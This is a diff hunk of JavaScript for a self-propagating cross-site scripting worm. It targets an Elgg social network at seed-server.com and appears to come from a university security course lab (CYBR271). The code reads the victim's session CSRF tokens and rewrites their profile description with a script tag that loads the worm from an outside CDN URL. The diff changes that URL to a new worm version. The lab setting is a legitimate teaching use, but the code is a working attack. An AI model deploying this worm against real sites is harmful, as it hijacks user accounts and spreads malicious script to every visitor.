@@ -6,7 +6,7 @@ window.onload = function(){
     var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
     var token="&__elgg_token="+elgg.security.token.__elgg_token;
     //Set the victims About me to the worm
-    var content=token+ts+userName+'&description=<script src="https://cdn.jsdelivr.net/gh/kakp0/CYBR271-XSS/WORM.js"></script>'+guid; 
+    var content=token+ts+userName+'&description=<script src="https://cdn.jsdelivr.net/gh/kakp0/CYBR271-XSS/WORM-V3.js"></script>'+guid; 
     var samyGuid=59; 
     var sendurl="http://www.seed-server.com/action/profile/edit"; 
     if(elgg.session.user.guid!=samyGuid) 
